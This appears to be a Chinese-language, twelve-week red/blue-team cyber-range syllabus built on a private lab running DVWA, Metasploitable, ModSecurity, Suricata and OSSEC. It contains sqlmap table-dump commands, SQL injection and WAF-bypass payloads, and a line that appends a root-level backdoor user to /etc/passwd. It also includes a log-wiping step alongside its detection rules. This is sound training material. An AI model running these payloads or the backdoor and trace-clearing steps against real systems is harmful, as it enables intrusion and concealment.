# 🎯 Cyber Range 红蓝攻防实战 — 学习路线总纲

> 三阶段递进：攻击思维 → 防御体系 → 流量分析 → 攻防合一
> 所有操作在自有服务器内完成，严禁对外部非授权目标发起攻击！

---

## 📅 Phase 1: 红队 — 渗透测试实战（第 1-3 周）

### 1.1 环境准备

```bash
# 部署红队环境
cd /root/cyber-range/lab/scripts
chmod +x deploy-lab.sh
sudo ./deploy-lab.sh

# 选模式 2: Kali + DVWA

# 访问 Kali Web 桌面
浏览器打开: http://kali.18257.xyz  (或 http://服务器IP:3001)
```

### 1.2 学习路线（每天 1-2 小时）

| 天数 | 内容 | 实操 | 工具 |
|------|------|------|------|
| **Day 1** | Linux 渗透基础 | 熟悉 Kali 命令行 | `ls`, `find`, `netstat`, `ps`, `grep` |
| **Day 2** | 信息收集 | 对 DVWA 做被动/主动侦察 | `nmap`, `dirb`, `gobuster`, `whatweb` |
| **Day 3** | Web 漏洞: XSS | DVWA → XSS (Reflected) | Burp Suite, 浏览器 F12 |
| **Day 4** | Web 漏洞: SQL 注入 | DVWA → SQL Injection | `sqlmap`, Burp Repeater |
| **Day 5** | Web 漏洞: 文件上传 | DVWA → File Upload | Burp Suite, weevely |
| **Day 6** | Web 漏洞: CSRF | DVWA → CSRF | Burp Suite |
| **Day 7** | 综合演练 | DVWA Low 级别全部通关 | 不限 |

#### Day 2 实操 — 信息收集

在 Kali 终端中执行：

```bash
# 1. 扫描 DVWA 开放端口和服务
nmap -sV -sC -p- 172.30.0.20

# 2. 目录爆破
gobuster dir -u http://172.30.0.20 -w /usr/share/wordlists/dirb/common.txt

# 3. 识别 Web 技术栈
whatweb http://172.30.0.20

# 记录发现: PHP + MySQL + Apache, 开放的敏感目录
```

#### Day 4 实操 — SQL 注入

在 Kali 中对 DVWA 进行 SQL 注入：

```bash
# 1. 先手动测试注入点（用 Burp 抓包看参数）
# DVWA → SQL Injection → User ID 输入: 1'

# 2. 用 sqlmap 自动化（抓到 cookie 后）
sqlmap -u "http://172.30.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=xxx; security=low" \
       --dbs

# 3. 拖库
sqlmap -u "..." --cookie="..." -D dvwa --tables
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
```

### 1.3 Phase 1 考核

- [ ] 能在 10 分钟内完成对未知目标的基本信息收集
- [ ] 能独立利用 DVWA Low 级别的全部漏洞（7 种）
- [ ] 能用 Burp Suite 拦截、修改、重放 HTTP 请求
- [ ] 能写出 5 行以上的 Python 漏洞利用脚本

---

## 📅 Phase 2: 蓝队 — 防御体系构建（第 4-6 周）

### 2.1 环境准备

```bash
# 在已有红队基础上，部署蓝队
cd /root/cyber-range/lab/scripts
sudo ./deploy-lab.sh
# 蓝队部署选 Y
```

### 2.2 学习路线

| 天数 | 内容 | 实操 |
|------|------|------|
| **Day 1** | WAF 原理 | 对比直接访问 DVWA vs 通过 WAF 代理访问的差异 |
| **Day 2** | OWASP CRS 规则 | 分析 ModSecurity 拦截日志，理解每条规则含义 |
| **Day 3** | 绕过 WAF 实战 | 尝试用编码/注释/分块传输绕过 WAF 攻击 DVWA |
| **Day 4** | 加强 WAF 规则 | 编写自定义规则拦截特定攻击 |
| **Day 5** | OSSEC 文件完整性 | 修改 `/etc/passwd` 等敏感文件，观察 OSSEC 告警 |
| **Day 6** | OSSEC 日志分析 | 配置 OSSEC 监控 SSH 登录、sudo 操作 |
| **Day 7** | 防御总结 | 画图: 从外到内的纵深防御体系 |

#### Day 1-2 实操 — WAF vs 无 WAF

```bash
# 测试1: 直接攻击 DVWA（无 WAF）
# Kali 中执行:
curl "http://172.30.0.20/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"

# 测试2: 通过 WAF 攻击（被拦截）
curl "http://172.30.0.50:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"
# 预期结果: 403 Forbidden — 被 WAF 拦截！

# 查看 WAF 拦截日志
docker logs lab-waf | grep -i "modsecurity\|blocked"

# 分析: 是哪条规则拦截了 SQL 注入？
# grep "id:" 看 ModSecurity 规则 ID → 去 OWASP CRS 查含义
```

#### Day 3 实操 — 绕过 WAF 尝试

```bash
# 尝试1: URL 编码绕过
curl "http://172.30.0.50:8080/?id=1%27%20OR%20%271%27%3D%271"

# 尝试2: 大小写混合
curl "http://172.30.0.50:8080/?id=1' oR '1'='1"

# 尝试3: 注释混淆
curl "http://172.30.0.50:8080/?id=1'/**/OR/**/'1'='1"

# 记录: 哪种绕过了? 为什么?
```

#### Day 5 实操 — OSSEC 文件完整性

```bash
# 在服务器上:
echo "test_user:x:0:0:test:/root:/bin/bash" >> /etc/passwd

# 查看 OSSEC 告警
docker logs lab-ossec-server | grep -i "alert\|passwd"
# 预期: OSSEC 检测到 /etc/passwd 被修改，发出告警！
```

### 2.3 Phase 2 考核

- [ ] 能解释 WAF 的工作原理和 OWASP CRS 核心规则
- [ ] 能在 WAF 保护下成功渗透 DVWA（理解绕过方法）
- [ ] 能编写 3 条自定义 ModSecurity 规则
- [ ] 能通过修改文件触发 OSSEC 告警，并定位告警原因

---

## 📅 Phase 3: 网络流量分析（第 7-9 周）

### 3.1 环境准备

```bash
# Suricata 已在 Phase 2 部署

# 流量抓包练习
tcpdump -i docker0 -w /mnt/data/lab/traffic/capture.pcap
# Ctrl+C 停止后，下载 capture.pcap 用 Wireshark 分析
```

### 3.2 学习路线

| 天数 | 内容 | 实操 |
|------|------|------|
| **Day 1** | TCP/IP 协议深度 | Wireshark 分析一次完整 HTTP 请求的三次握手 |
| **Day 2** | 识别扫描流量 | 从 Kali 执行 `nmap -sS`，在 Suricata 日志中找告警 |
| **Day 3** | 识别攻击流量 | 从 Kali 攻击 DVWA，分析流量特征 |
| **Day 4** | 编写 Suricata 规则 | 自定义规则检测特定流量 |
| **Day 5** | 公网流量分析 | 分析服务器真实入站流量的扫描/攻击行为 |
| **Day 6** | DNS 隧道检测 | 理解 DNS 隐蔽通道原理 |
| **Day 7** | 综合实战 | 攻击者视角 vs 防御者视角对比分析 |

#### Day 2 实操 — 识别扫描流量

```bash
# 在 Kali 中执行 nmap 扫描
nmap -sS -p 1-1000 172.30.0.20

# 在服务器上查看 Suricata 日志
cat /mnt/data/lab/suricata/logs/fast.log | grep -i scan

# 看 JSON 格式详细信息
cat /mnt/data/lab/suricata/logs/eve.json | jq 'select(.alert.action=="allowed")'
```

#### Day 5 实操 — 公网流量分析

```bash
# 抓取 5 分钟的 eth0 入站流量
tcpdump -i eth0 -w /mnt/data/lab/traffic/public_traffic.pcap -G 300 -W 1

# 下载到本地用 Wireshark 打开
# 重点看:
# 1. Statistics → Conversations → 按流量排序 → 谁在扫我?
# 2. 过滤: tcp.flags.syn==1 and tcp.flags.ack==0 → SYN 扫描
# 3. 过滤: http.request → 看有没有 Web 攻击请求
```

#### Day 6 实操 — 编写 Suricata 自定义规则

```bash
# 创建自定义规则文件
cat > /mnt/data/lab/suricata/rules/custom.rules << 'EOF'
# 检测 SQL 注入尝试
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"CUSTOM - SQL Injection Attempt";
    flow:to_server,established;
    http.uri; content:"union"; nocase;
    http.uri; content:"select"; nocase; distance:0;
    classtype:web-application-attack;
    sid:1000001; rev:1;
)

# 检测目录扫描
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"CUSTOM - Directory Bruteforce";
    flow:to_server,established;
    threshold: type threshold, track by_src, count 50, seconds 10;
    classtype:attempted-recon;
    sid:1000002; rev:1;
)

# 检测密码爆破
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"CUSTOM - Login Bruteforce";
    flow:to_server,established;
    http.uri; content:"/login"; nocase;
    threshold: type threshold, track by_src, count 10, seconds 60;
    classtype:brute-force;
    sid:1000003; rev:1;
)
EOF

# 更新 Suricata 配置加载自定义规则，重启
docker restart lab-suricata

# 验证: 从 Kali 发起攻击，看自定义规则是否触发
```

### 3.3 Phase 3 考核

- [ ] 能用 Wireshark 解析一次完整 HTTP 请求的全部层次
- [ ] 能从 Suricata 日志中区分正常流量和攻击流量
- [ ] 能编写 5 条有效的 Suricata 自定义规则
- [ ] 能完成一次完整的"攻击→检测→溯源"闭环

---

## 🏆 Phase 4: 攻防合一 — 综合实战（第 10-12 周）

### 场景1: 完整渗透测试链

```
目标: 从外网突破 → 获取 WebShell → 提权 → 内网横向 → 获取域控
环境: Kali + DVWA + Metasploitable + Juice Shop
```

**每一步的目标和命令：**

```bash
# Step 1: 外网信息收集
nmap -sV -sC 172.30.0.20/28  # 扫描整个靶场网段

# Step 2: Web 漏洞利用
# 针对 DVWA 的 SQL 注入，获取 WebShell

# Step 3: 权限提升
# 拿到 WebShell 后，提权到 root

# Step 4: 内网横向
# 从 172.30.0.20 跳板到 172.30.0.30 (Metasploitable)

# Step 5: 清理痕迹
# 删除日志、断开连接
```

### 场景2: 蓝队防御演练

```
攻击方: 对 DVWA 发起全量攻击
防御方: 依次对比无防护 / WAF / WAF+IDS / WAF+IDS+HIDS 的防护效果
```

**对比表：**

| 防护层次 | 拦截 XSS | 拦截 SQLi | 检测扫描 | 检测文件篡改 |
|----------|----------|-----------|----------|------------|
| 无防护 | ❌ | ❌ | ❌ | ❌ |
| ModSecurity | ✅ | ✅ | ❌ | ❌ |
| +Suricata | ✅ | ✅ | ✅ | ❌ |
| +OSSEC | ✅ | ✅ | ✅ | ✅ |

### 场景3: 流量分析比赛

```
管理员在服务器上执行了一次"被入侵"操作（如添加后门用户）
你的任务: 
1. 从 Suricata 日志中找出攻击发生的时间窗口
2. 从 OSSEC 日志中找到被篡改的文件
3. 从流量包中还原攻击者的完整操作序列
```

---

## 📚 推荐工具清单

### 攻击工具（Kali 已预装）
```
nmap, sqlmap, hydra, john, metasploit, burpsuite,
gobuster, dirb, nikto, wpscan, searchsploit, netcat
```

### 防御工具（服务器已部署）
```
ModSecurity + OWASP CRS, Suricata, OSSEC, Fail2Ban, nftables
```

### 分析工具（本地安装）
```
Wireshark, CyberChef, VSCode, Python3
```

---

## ⚠️ 重要法务合规声明

```
1. 本实验室仅供在自有服务器 (103.52.155.218) 内部进行授权测试
2. 严禁使用学到的技术对任何非授权目标发起攻击
3. 违反者将承担全部法律责任
4. 《网络安全法》第27条: 不得从事非法侵入他人网络等危害网络安全的活动
5. 请签署《网络安全靶场使用承诺书》后开始实验
```

---

## 📊 进度追踪表

```
姓名: ________  开始日期: ________

Phase 1 红队
  □ Day 1-7  DVWA Low 级别通关
  □ 信息收集方法论掌握
  □ SQL注入独立完成
  □ 写了 5+ 行 Python 利用脚本

Phase 2 蓝队
  □ WAF 与无 WAF 攻击对比实验完成
  □ 3 条自定义 ModSecurity 规则
  □ OSSEC 告警触发与定位
  □ 纵深防御体系图

Phase 3 流量分析
  □ TCP 三次握手完整分析
  □ 5 条 Suricata 自定义规则
  □ 公网流量分析报告
  □ 攻击→检测闭环完成

Phase 4 综合实战
  □ 完整渗透测试链
  □ 防御效果对比表
  □ 流量分析比赛
```
